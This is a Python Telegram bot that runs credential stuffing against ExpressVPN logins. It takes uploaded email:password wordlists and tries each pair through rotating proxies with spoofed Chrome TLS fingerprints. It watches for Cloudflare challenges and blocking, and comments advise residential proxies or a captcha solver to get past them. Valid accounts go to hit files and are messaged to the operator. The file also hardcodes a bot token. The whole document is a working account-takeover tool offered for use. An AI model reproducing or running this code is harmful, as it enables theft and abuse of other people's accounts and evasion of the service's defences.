import asyncio
import random
import time
import logging
import os
import re
from datetime import datetime
from urllib.parse import urlencode
from concurrent.futures import ThreadPoolExecutor

import tls_client

from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import Command, CommandStart
from aiogram.types import (
    InlineKeyboardMarkup, InlineKeyboardButton,
    FSInputFile, BufferedInputFile
)

# ══════════════════════════════════════
# CONFIG
# ══════════════════════════════════════

BOT_TOKEN = "8874770214:AAEdKYEfTo2Rtdjt2pkJQoVbIHJeQnj2GPI"
ADMIN_IDS = [5544288619]

MAX_CONCURRENT = 5
HIT_FILE = "hits.txt"
FREE_FILE = "free_accounts.txt"
EXPIRED_FILE = "expired_accounts.txt"
PROXY_FILE = "proxies.txt"
PROXY_CHECK_URL = "https://api.ipify.org?format=json"
PROXY_CHECK_TIMEOUT = 15
REQUEST_TIMEOUT = 30
RETRY_COUNT = 2

# ══════════════════════════════════════
# LOGGING
# ══════════════════════════════════════

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

bot = Bot(token=BOT_TOKEN)
dp = Dispatcher()
executor = ThreadPoolExecutor(max_workers=MAX_CONCURRENT)

# ══════════════════════════════════════
# PROXY MANAGER
# ══════════════════════════════════════

class ProxyManager:
    def __init__(self):
        self.proxies = []
        self.dead_proxies = []
        self.proxy_stats = {}
        self.load_from_file()

    def load_from_file(self):
        if not os.path.exists(PROXY_FILE):
            return
        with open(PROXY_FILE, "r") as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith("#") and line not in self.proxies:
                    self.proxies.append(line)
                    self.proxy_stats[line] = {
                        "alive": None, "last_check": 0, "speed": 0, "failures": 0
                    }

    def save_to_file(self):
        with open(PROXY_FILE, "w") as f:
            f.write(f"# Updated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write(f"# Total: {len(self.proxies)}\n")
            for p in self.proxies:
                f.write(f"{p}\n")

    def add(self, proxy):
        proxy = proxy.strip()
        if not proxy or proxy in self.proxies:
            return False
        self.proxies.append(proxy)
        self.proxy_stats[proxy] = {
            "alive": None, "last_check": 0, "speed": 0, "failures": 0
        }
        self.save_to_file()
        return True

    def add_many(self, proxies):
        added = 0
        dupes = 0
        for p in proxies:
            p = p.strip()
            if not p or p.startswith("#"):
                continue
            if self.add(p):
                added += 1
            else:
                dupes += 1
        return added, dupes

    def remove(self, proxy):
        if proxy in self.proxies:
            self.proxies.remove(proxy)
            self.proxy_stats.pop(proxy, None)
            self.save_to_file()
            return True
        return False

    def remove_dead(self):
        dead = [p for p, s in self.proxy_stats.items() if s["alive"] is False]
        for p in dead:
            self.proxies.remove(p)
            self.proxy_stats.pop(p, None)
            self.dead_proxies.append(p)
        self.save_to_file()
        return len(dead)

    def get_random(self):
        if not self.proxies:
            return None
        return random.choice(self.proxies)

    def format_proxy(self, raw):
        if raw.startswith(("http://", "https://", "socks4://", "socks5://")):
            return raw
        parts = raw.split(":")
        if len(parts) == 2:
            return f"http://{parts[0]}:{parts[1]}"
        elif len(parts) == 4:
            ip, port, user, pwd = parts
            return f"http://{user}:{pwd}@{ip}:{port}"
        elif "@" in raw:
            return f"http://{raw}"
        else:
            return f"http://{raw}"

    def get_tls_proxy(self):
        raw = self.get_random()
        if not raw:
            return None
        return self.format_proxy(raw)

    def check_single_sync(self, proxy):
        formatted = self.format_proxy(proxy)
        start = time.time()
        try:
            s = tls_client.Session(client_identifier="chrome_120", random_tls_extension_order=True)
            s.proxies = {"http": formatted, "https": formatted}
            resp = s.get(PROXY_CHECK_URL, timeout_seconds=PROXY_CHECK_TIMEOUT)
            elapsed = (time.time() - start) * 1000
            if resp.status_code == 200:
                self.proxy_stats[proxy] = {
                    "alive": True, "last_check": time.time(),
                    "speed": round(elapsed), "failures": 0
                }
                return True, elapsed
            else:
                self.proxy_stats[proxy] = {
                    "alive": False, "last_check": time.time(),
                    "speed": 0,
                    "failures": self.proxy_stats.get(proxy, {}).get("failures", 0) + 1
                }
                return False, 0
        except Exception:
            self.proxy_stats[proxy] = {
                "alive": False, "last_check": time.time(),
                "speed": 0,
                "failures": self.proxy_stats.get(proxy, {}).get("failures", 0) + 1
            }
            return False, 0

    async def check_all(self, concurrency=10):
        loop = asyncio.get_event_loop()
        semaphore = asyncio.Semaphore(concurrency)
        results = []

        async def _check(proxy):
            async with semaphore:
                alive, speed = await loop.run_in_executor(
                    executor, self.check_single_sync, proxy
                )
                results.append((proxy, alive, speed))

        tasks = [_check(p) for p in self.proxies]
        await asyncio.gather(*tasks, return_exceptions=True)
        alive_count = sum(1 for _, a, _ in results if a)
        return {
            "alive": alive_count,
            "dead": len(results) - alive_count,
            "results": results
        }

    def get_stats(self):
        alive = sum(1 for s in self.proxy_stats.values() if s["alive"] is True)
        dead = sum(1 for s in self.proxy_stats.values() if s["alive"] is False)
        unknown = sum(1 for s in self.proxy_stats.values() if s["alive"] is None)
        speeds = [s["speed"] for s in self.proxy_stats.values() if s["alive"] and s["speed"] > 0]
        avg_speed = round(sum(speeds) / len(speeds)) if speeds else 0
        return {
            "total": len(self.proxies), "alive": alive,
            "dead": dead, "unknown": unknown,
            "avg_speed_ms": avg_speed, "dead_pool": len(self.dead_proxies)
        }

    def export(self):
        content = f"# Proxies — {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
        content += f"# Total: {len(self.proxies)}\n\n"
        for p in self.proxies:
            status = self.proxy_stats.get(p, {})
            speed = status.get("speed", 0)
            alive_str = "🟢" if status.get("alive") else "🔴"
            content += f"{p} | {alive_str} | {speed}ms\n"
        return content.encode()

    def clear_all(self):
        self.proxies.clear()
        self.proxy_stats.clear()
        self.save_to_file()


proxy_manager = ProxyManager()

# ══════════════════════════════════════
# STATE
# ══════════════════════════════════════

checking_running = False
stats = {
    "total": 0, "hit": 0, "fail": 0,
    "free": 0, "expired": 0,
    "unknown": 0, "errors": 0, "blocked": 0,
    "start_time": None
}
checked_count = 0
lock = asyncio.Lock()
proxy_check_running = False


# ══════════════════════════════════════
# HELPERS
# ══════════════════════════════════════

def is_admin(user_id):
    return user_id in ADMIN_IDS


def save_hit(email, password, result_type):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    line = f"{email}:{password} | {result_type} | {timestamp}\n"
    target = {"HIT": HIT_FILE, "FREE": FREE_FILE, "EXPIRED": EXPIRED_FILE}.get(result_type)
    if target:
        with open(target, "a", encoding="utf-8") as f:
            f.write(line)


# ══════════════════════════════════════
# EXPRESSVPN CHECKER (tls_client)
# ══════════════════════════════════════

def check_expressvpn_sync(email, password):
    """Sync check using tls_client with Chrome TLS fingerprint."""
    last_error = "Unknown"

    for attempt in range(RETRY_COUNT + 1):
        try:
            session = tls_client.Session(
                client_identifier="chrome_120",
                random_tls_extension_order=True
            )

            proxy_raw = proxy_manager.get_random()
            if proxy_raw:
                formatted = proxy_manager.format_proxy(proxy_raw)
                session.proxies = {"http": formatted, "https": formatted}

            # ── Step 1: GET login page ──
            get_headers = {
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
                "Accept-Language": "en-US,en;q=0.9",
                "Sec-Ch-Ua": '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
                "Sec-Ch-Ua-Mobile": "?0",
                "Sec-Ch-Ua-Platform": '"Windows"',
                "Sec-Fetch-Dest": "document",
                "Sec-Fetch-Mode": "navigate",
                "Sec-Fetch-Site": "none",
                "Sec-Fetch-User": "?1",
                "Upgrade-Insecure-Requests": "1",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            }

            resp_get = session.get(
                "https://www.expressvpn.com/?tab=login&modal=auth",
                headers=get_headers,
                timeout_seconds=REQUEST_TIMEOUT,
                allow_redirects=True
            )

            html = resp_get.text
            status_get = resp_get.status_code

            if status_get == 403:
                return "BLOCKED", f"HTTP 403 — IP blocked."
            if "cf-chl" in html.lower() or "just a moment" in html.lower():
                return "CAPTCHA", "Cloudflare challenge."
            if status_get == 429:
                return "BLOCKED", "HTTP 429 — Rate limited."

            # ── Step 2: Extract CSRF ──
            csrftoken = ""
            for cookie in session.cookies:
                if "csrftoken" in cookie:
                    csrftoken = session.cookies[cookie]

            if not csrftoken:
                m = re.search(r'csrfmiddlewaretoken"\s+value="([^"]+)"', html)
                if m:
                    csrftoken = m.group(1)

            # ── Step 3: POST login ──
            post_headers = {
                "Accept": "*/*",
                "Accept-Language": "en-US,en;q=0.9",
                "Content-Type": "application/x-www-form-urlencoded",
                "Origin": "https://www.expressvpn.com",
                "Referer": "https://www.expressvpn.com/",
                "Sec-Ch-Ua": '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
                "Sec-Ch-Ua-Mobile": "?0",
                "Sec-Ch-Ua-Platform": '"Windows"',
                "Sec-Fetch-Dest": "empty",
                "Sec-Fetch-Mode": "cors",
                "Sec-Fetch-Site": "same-origin",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
                "X-Requested-With": "XMLHttpRequest",
            }

            if csrftoken:
                post_headers["X-Csrftoken"] = csrftoken

            login_data = {
                "username": email,
                "password": password,
                "token": csrftoken,
                "redirect": "",
                "from": "pc_premium_login",
                "segment": "straight",
            }

            resp_post = session.post(
                "https://www.expressvpn.com/en/login?",
                data=urlencode(login_data),
                headers=post_headers,
                timeout_seconds=REQUEST_TIMEOUT
            )

            result = resp_post.text
            status_code = resp_post.status_code

            # ── Step 4: Keycheck ──
            if '"success":"1"' in result:
                return "HIT", result
            elif '"success":"0"' in result:
                return "FAIL", result
            elif "signup" in result:
                return "FREE", result
            elif 'balance":0' in result:
                return "EXPIRED", result
            elif "captcha" in result.lower() or "challenge" in result.lower():
                return "CAPTCHA", f"Challenge (HTTP {status_code})"
            elif status_code == 403:
                return "BLOCKED", f"HTTP 403 — blocked"
            elif status_code == 429:
                return "BLOCKED", f"HTTP 429 — rate limited"
            else:
                return "UNKNOWN", f"HTTP {status_code}: {result[:400]}"

        except Exception as e:
            last_error = f"{type(e).__name__}: {str(e)[:200]}"
            continue

    return "ERROR", last_error


async def check_expressvpn(email, password):
    loop = asyncio.get_event_loop()
    return await loop.run_in_executor(executor, check_expressvpn_sync, email, password)


# ══════════════════════════════════════
# BULK CHECKER
# ══════════════════════════════════════

async def bulk_check(wordlist, chat_id):
    global checking_running, checked_count

    checking_running = True
    stats["start_time"] = time.time()
    stats["total"] = len(wordlist)
    checked_count = 0

    semaphore = asyncio.Semaphore(MAX_CONCURRENT)

    async def check_one(credential):
        global checked_count
        async with semaphore:
            if not checking_running:
                return
            if ":" not in credential:
                return
            email, password = credential.split(":", 1)
            status, detail = await check_expressvpn(email, password)

            async with lock:
                checked_count += 1
                key = status.lower()
                if key in stats:
                    stats[key] += 1
                else:
                    stats["errors"] += 1

                if status in ("HIT", "FREE", "EXPIRED"):
                    save_hit(email, password, status)

                if status == "HIT":
                    await bot.send_message(chat_id,
                        f"🟢 **HIT!**\nEmail: `{email}`\nPassword: `{password}`",
                        parse_mode="Markdown")
                elif status == "FREE":
                    await bot.send_message(chat_id,
                        f"🔓 **FREE** — `{email}`",
                        parse_mode="Markdown")

                if checked_count % 25 == 0:
                    elapsed = time.time() - stats["start_time"]
                    cpm = int(checked_count / (elapsed / 60)) if elapsed > 0 else 0
                    await bot.send_message(chat_id,
                        f"📊 {checked_count}/{stats['total']} | CPM: {cpm}\n"
                        f"✅ {stats['hit']} | 🔓 {stats['free']} | ❌ {stats['fail']}")

    tasks = [check_one(c) for c in wordlist]
    await asyncio.gather(*tasks, return_exceptions=True)
    checking_running = False

    elapsed = time.time() - stats["start_time"]
    cpm = int(stats["total"] / (elapsed / 60)) if elapsed > 0 else 0

    await bot.send_message(chat_id,
        f"{'═' * 28}\n🏁 **DONE**\n{'═' * 28}\n"
        f"Total: {stats['total']} | Time: {elapsed:.0f}s | CPM: {cpm}\n"
        f"{'─' * 28}\n"
        f"🟢 Hits: {stats['hit']} | 🔓 Free: {stats['free']}\n"
        f"⚠️ Expired: {stats['expired']} | ❌ Fails: {stats['fail']}\n"
        f"🚫 Blocked: {stats.get('blocked', 0)} | 💥 Errors: {stats['errors']}",
        parse_mode="Markdown")

    for fn in [HIT_FILE, FREE_FILE, EXPIRED_FILE]:
        if os.path.exists(fn) and os.path.getsize(fn) > 0:
            await bot.send_document(chat_id, FSInputFile(fn))


# ══════════════════════════════════════
# PROXY COMMANDS
# ══════════════════════════════════════

@dp.message(Command("proxy"))
async def cmd_proxy_menu(message: types.Message):
    if not is_admin(message.from_user.id):
        return

    ps = proxy_manager.get_stats()
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="➕ Add Proxy", callback_data="proxy_add"),
         InlineKeyboardButton(text="📁 Add from File", callback_data="proxy_addfile")],
        [InlineKeyboardButton(text="🔍 Check All", callback_data="proxy_checkall"),
         InlineKeyboardButton(text="🔄 Auto Remove Dead", callback_data="proxy_autoremove")],
        [InlineKeyboardButton(text="📊 Stats", callback_data="proxy_stats"),
         InlineKeyboardButton(text="📋 Export", callback_data="proxy_export")],
        [InlineKeyboardButton(text="🗑 Remove Dead", callback_data="proxy_removedead"),
         InlineKeyboardButton(text="💥 Clear All", callback_data="proxy_clear")],
    ])
    await message.reply(
        f"🔧 **Proxy Manager**\n{'─' * 22}\n"
        f"Total: {ps['total']}\n🟢 Alive: {ps['alive']}\n"
        f"🔴 Dead: {ps['dead']}\n❓ Unknown: {ps['unknown']}\n"
        f"⚡ Avg Speed: {ps['avg_speed_ms']}ms\n{'─' * 22}\nChoose:",
        reply_markup=keyboard, parse_mode="Markdown"
    )


@dp.message(Command("proxyadd"))
async def cmd_proxy_add(message: types.Message):
    if not is_admin(message.from_user.id):
        return
    args = message.text.split(maxsplit=1)
    if len(args) < 2:
        await message.reply(
            "Usage:\n`/proxyadd 1.2.3.4:8080`\n"
            "`/proxyadd 1.2.3.4:8080:user:pass`\n"
            "`/proxyadd socks5://1.2.3.4:1080`\n"
            "Multi-line လည်း ရတယ်",
            parse_mode="Markdown"
        )
        return
    raw = args[1].strip()
    proxies = [p.strip() for p in raw.split("\n") if p.strip()]
    added, dupes = proxy_manager.add_many(proxies)
    await message.reply(
        f"✅ Added: **{added}**\n⚠️ Duplicates: **{dupes}**\n"
        f"Total: **{len(proxy_manager.proxies)}**",
        parse_mode="Markdown"
    )


@dp.message(Command("proxycheck"))
async def cmd_proxy_check(message: types.Message):
    if not is_admin(message.from_user.id):
        return
    if proxy_check_running:
        await message.reply("⚠️ Check already running.")
        return
    asyncio.create_task(_run_proxy_check(message.chat.id, auto_remove=False))


@dp.message(Command("proxyautoremove"))
async def cmd_proxy_auto_remove(message: types.Message):
    if not is_admin(message.from_user.id):
        return
    if proxy_check_running:
        await message.reply("⚠️ Check already running.")
        return
    asyncio.create_task(_run_proxy_check(message.chat.id, auto_remove=True))


async def _run_proxy_check(chat_id, auto_remove=False):
    global proxy_check_running
    proxy_check_running = True
    total = len(proxy_manager.proxies)
    if total == 0:
        await bot.send_message(chat_id, "❌ No proxies to check.")
        proxy_check_running = False
        return

    await bot.send_message(chat_id,
        f"🔍 Checking **{total}** proxies...",
        parse_mode="Markdown")

    result = await proxy_manager.check_all(concurrency=10)
    removed = 0
    if auto_remove:
        removed = proxy_manager.remove_dead()

    alive_proxies = [(p, s) for p, a, s in result["results"] if a]
    alive_proxies.sort(key=lambda x: x[1])

    msg = (
        f"{'═' * 28}\n🔍 **PROXY CHECK DONE**\n{'═' * 28}\n"
        f"Total: {total}\n🟢 Alive: {result['alive']}\n🔴 Dead: {result['dead']}\n"
    )
    if auto_remove and removed > 0:
        msg += f"🗑 Auto-removed: {removed}\n"
    if alive_proxies:
        msg += f"\n**Top 10 fastest:**\n"
        for p, speed in alive_proxies[:10]:
            msg += f"  ⚡ `{p}` — {speed:.0f}ms\n"
    msg += f"{'═' * 28}"
    await bot.send_message(chat_id, msg, parse_mode="Markdown")
    proxy_check_running = False


@dp.message(Command("proxystats"))
async def cmd_proxy_stats(message: types.Message):
    if not is_admin(message.from_user.id):
        return
    ps = proxy_manager.get_stats()
    await message.reply(
        f"📊 **Proxy Stats**\n{'─' * 22}\n"
        f"Total: {ps['total']}\n🟢 {ps['alive']}\n🔴 {ps['dead']}\n"
        f"❓ {ps['unknown']}\n⚡ {ps['avg_speed_ms']}ms\n"
        f"💀 Dead Pool: {ps['dead_pool']}\n{'─' * 22}",
        parse_mode="Markdown"
    )


@dp.message(Command("proxyexport"))
async def cmd_proxy_export(message: types.Message):
    if not is_admin(message.from_user.id):
        return
    data = proxy_manager.export()
    doc = BufferedInputFile(data, filename=f"proxies_{datetime.now().strftime('%Y%m%d')}.txt")
    await message.reply_document(doc)


@dp.message(Command("proxyremove"))
async def cmd_proxy_remove(message: types.Message):
    if not is_admin(message.from_user.id):
        return
    args = message.text.split(maxsplit=1)
    if len(args) < 2:
        await message.reply("Usage: `/proxyremove 1.2.3.4:8080`", parse_mode="Markdown")
        return
    proxy = args[1].strip()
    if proxy_manager.remove(proxy):
        await message.reply(f"🗑 Removed: `{proxy}`\nTotal: {len(proxy_manager.proxies)}", parse_mode="Markdown")
    else:
        await message.reply(f"❌ Not found: `{proxy}`", parse_mode="Markdown")


@dp.message(Command("proxyclear"))
async def cmd_proxy_clear(message: types.Message):
    if not is_admin(message.from_user.id):
        return
    count = len(proxy_manager.proxies)
    proxy_manager.clear_all()
    await message.reply(f"💥 Cleared **{count}** proxies.")


# ══════════════════════════════════════
# CHECKER COMMANDS
# ══════════════════════════════════════

@dp.message(CommandStart())
async def cmd_start(message: types.Message):
    if not is_admin(message.from_user.id):
        await message.reply("⛔ Unauthorized.")
        return

    ps = proxy_manager.get_stats()
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🔍 Single Check", callback_data="single"),
         InlineKeyboardButton(text="📋 Bulk Check", callback_data="bulk")],
        [InlineKeyboardButton(text="🔧 Proxy Manager", callback_data="proxy_menu"),
         InlineKeyboardButton(text="📊 Stats", callback_data="stats")],
        [InlineKeyboardButton(text="🛑 Stop", callback_data="stop"),
         InlineKeyboardButton(text="📁 Files", callback_data="files")],
    ])
    await message.reply(
        f"🔧 **ExpressVPN Checker Bot**\n{'─' * 22}\n"
        f"Proxies: {ps['total']} ({ps['alive']} alive)\n"
        f"Threads: {MAX_CONCURRENT}\n{'─' * 22}\n"
        f"**Commands:**\n"
        f"`/check email:pass` — single\n"
        f"`/proxy` — proxy manager\n"
        f"`/proxyadd ip:port` — add proxy\n"
        f"`/proxycheck` — check proxies\n"
        f"`/proxyautoremove` — check + remove dead\n"
        f"`/stop` — stop checking",
        reply_markup=keyboard, parse_mode="Markdown"
    )


@dp.message(Command("check"))
async def cmd_check(message: types.Message):
    if not is_admin(message.from_user.id):
        return
    args = message.text.split(maxsplit=1)
    if len(args) < 2 or ":" not in args[1]:
        await message.reply("Usage: `/check email:password`", parse_mode="Markdown")
        return
    email, password = args[1].strip().split(":", 1)
    processing = await message.reply(f"⏳ Checking `{email}`...", parse_mode="Markdown")
    status, detail = await check_expressvpn(email, password)
    emoji = {
        "HIT": "🟢", "FAIL": "❌", "FREE": "🔓",
        "EXPIRED": "⚠️", "CAPTCHA": "🧩", "ERROR": "💥",
        "BLOCKED": "🚫", "UNKNOWN": "❓"
    }.get(status, "❓")

    if status in ("ERROR", "UNKNOWN", "BLOCKED", "CAPTCHA"):
        tip = ""
        if status == "BLOCKED":
            tip = "\n\n💡 **Residential proxy ထည့်ပြီး ပြန်စမ်းပါ။**"
        elif status == "CAPTCHA":
            tip = "\n\n💡 **Captcha solver လိုအပ်တယ်။**"
        await processing.edit_text(
            f"{emoji} **{status}**\n"
            f"Email: `{email}`\n"
            f"Password: `{password}`\n\n"
            f"**Detail:**\n`{detail[:500]}`{tip}",
            parse_mode="Markdown"
        )
    else:
        await processing.edit_text(
            f"{emoji} **{status}**\n"
            f"Email: `{email}`\nPassword: `{password}`",
            parse_mode="Markdown"
        )


@dp.message(Command("stop"))
async def cmd_stop(message: types.Message):
    global checking_running
    checking_running = False
    await message.reply("🛑 Stopped.")


# ══════════════════════════════════════
# CALLBACK HANDLERS
# ══════════════════════════════════════

@dp.callback_query(F.data == "stop")
async def cb_stop(callback: types.CallbackQuery):
    global checking_running
    checking_running = False
    await callback.message.reply("🛑 Stopped.")


@dp.callback_query(F.data == "stats")
async def cb_stats(callback: types.CallbackQuery):
    ps = proxy_manager.get_stats()
    elapsed = time.time() - stats["start_time"] if stats["start_time"] else 0
    cpm = int(checked_count / (elapsed / 60)) if elapsed > 0 and checked_count > 0 else 0
    await callback.message.reply(
        f"📊 **Checker Stats**\n{'─' * 22}\n"
        f"Checked: {checked_count} | CPM: {cpm}\n"
        f"🟢 {stats['hit']} | 🔓 {stats['free']} | ❌ {stats['fail']}\n"
        f"{'─' * 22}\n"
        f"**Proxies:** {ps['total']} ({ps['alive']} alive)",
        parse_mode="Markdown"
    )


@dp.callback_query(F.data == "files")
async def cb_files(callback: types.CallbackQuery):
    for fn in [HIT_FILE, FREE_FILE, EXPIRED_FILE]:
        if os.path.exists(fn) and os.path.getsize(fn) > 0:
            await callback.message.reply_document(FSInputFile(fn))


@dp.callback_query(F.data == "proxy_menu")
async def cb_proxy_menu(callback: types.CallbackQuery):
    ps = proxy_manager.get_stats()
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="➕ Add Proxy", callback_data="proxy_add"),
         InlineKeyboardButton(text="📁 Add from File", callback_data="proxy_addfile")],
        [InlineKeyboardButton(text="🔍 Check All", callback_data="proxy_checkall"),
         InlineKeyboardButton(text="🔄 Auto Remove Dead", callback_data="proxy_autoremove")],
        [InlineKeyboardButton(text="📊 Stats", callback_data="proxy_stats"),
         InlineKeyboardButton(text="📋 Export", callback_data="proxy_export")],
        [InlineKeyboardButton(text="🗑 Remove Dead", callback_data="proxy_removedead"),
         InlineKeyboardButton(text="💥 Clear All", callback_data="proxy_clear")],
    ])
    await callback.message.reply(
        f"🔧 **Proxy Manager**\n{'─' * 22}\n"
        f"Total: {ps['total']}\n🟢 Alive: {ps['alive']}\n"
        f"🔴 Dead: {ps['dead']}\n❓ Unknown: {ps['unknown']}\n"
        f"⚡ Avg Speed: {ps['avg_speed_ms']}ms\n{'─' * 22}\nChoose:",
        reply_markup=keyboard, parse_mode="Markdown"
    )


@dp.callback_query(F.data == "proxy_checkall")
async def cb_checkall(callback: types.CallbackQuery):
    if proxy_check_running:
        await callback.answer("⚠️ Already running")
        return
    asyncio.create_task(_run_proxy_check(callback.message.chat.id, auto_remove=False))
    await callback.answer("Checking...")


@dp.callback_query(F.data == "proxy_autoremove")
async def cb_autoremove(callback: types.CallbackQuery):
    if proxy_check_running:
        await callback.answer("⚠️ Already running")
        return
    asyncio.create_task(_run_proxy_check(callback.message.chat.id, auto_remove=True))
    await callback.answer("Checking + removing dead...")


@dp.callback_query(F.data == "proxy_export")
async def cb_export(callback: types.CallbackQuery):
    data = proxy_manager.export()
    doc = BufferedInputFile(data, filename="proxies.txt")
    await callback.message.reply_document(doc)


@dp.callback_query(F.data == "proxy_removedead")
async def cb_removedead(callback: types.CallbackQuery):
    removed = proxy_manager.remove_dead()
    await callback.message.reply(f"🗑 Removed **{removed}** dead proxies.")


@dp.callback_query(F.data == "proxy_clear")
async def cb_clear(callback: types.CallbackQuery):
    count = len(proxy_manager.proxies)
    proxy_manager.clear_all()
    await callback.message.reply(f"💥 Cleared **{count}** proxies.")


@dp.callback_query(F.data == "proxy_add")
async def cb_add(callback: types.CallbackQuery):
    await callback.message.reply(
        "➕ Send: `/proxyadd ip:port`\nMulti-line supported.",
        parse_mode="Markdown"
    )


@dp.callback_query(F.data == "proxy_addfile")
async def cb_addfile(callback: types.CallbackQuery):
    await callback.message.reply("📁 Send your proxy `.txt` file.")


@dp.callback_query(F.data == "single")
async def cb_single(callback: types.CallbackQuery):
    await callback.message.reply("Send: `/check email:password`", parse_mode="Markdown")


@dp.callback_query(F.data == "bulk")
async def cb_bulk(callback: types.CallbackQuery):
    await callback.message.reply("📋 Send your wordlist `.txt` file.")


# ══════════════════════════════════════
# FILE UPLOAD HANDLER
# ══════════════════════════════════════

@dp.message(F.document)
async def handle_file_upload(message: types.Message):
    if not is_admin(message.from_user.id):
        return

    file = await bot.get_file(message.document.file_id)
    downloaded = await bot.download_file(file.file_path)
    content = downloaded.read().decode("utf-8", errors="ignore")
    lines = [l.strip() for l in content.splitlines() if l.strip() and not l.startswith("#")]

    if not lines:
        await message.reply("❌ File ထဲ ဘာမှ မရှိဘူး။")
        return

    proxy_indicators = 0
    sample = lines[:20]
    for line in sample:
        parts = line.split(":")
        if len(parts) in (2, 4) and parts[-1].isdigit():
            proxy_indicators += 1
        elif line.startswith(("http://", "https://", "socks4://", "socks5://")):
            proxy_indicators += 1

    is_proxy_file = proxy_indicators > len(sample) * 0.5 if sample else False

    if is_proxy_file:
        added, dupes = proxy_manager.add_many(lines)
        await message.reply(
            f"📁 **Proxy file loaded**\n✅ Added: {added}\n"
            f"⚠️ Duplicates: {dupes}\nTotal: **{len(proxy_manager.proxies)}**",
            parse_mode="Markdown"
        )
    else:
        wordlist = [l for l in lines if ":" in l]
        if not wordlist:
            await message.reply("❌ No valid `email:password` found.")
            return
        if checking_running:
            await message.reply("⚠️ Already running. Use /stop first.")
            return
        await message.reply(
            f"📋 Wordlist: **{len(wordlist)}** creds\n"
            f"Starting with **{MAX_CONCURRENT}** threads...",
            parse_mode="Markdown"
        )
        asyncio.create_task(bulk_check(wordlist, message.chat.id))


# ══════════════════════════════════════
# MAIN
# ══════════════════════════════════════

async def main():
    for fn in [HIT_FILE, FREE_FILE, EXPIRED_FILE, PROXY_FILE]:
        if not os.path.exists(fn):
            open(fn, "w").close()

    logger.info(f"Loaded {len(proxy_manager.proxies)} proxies")
    logger.info("Bot starting...")
    await dp.start_polling(bot)


if __name__ == "__main__":
    asyncio.run(main())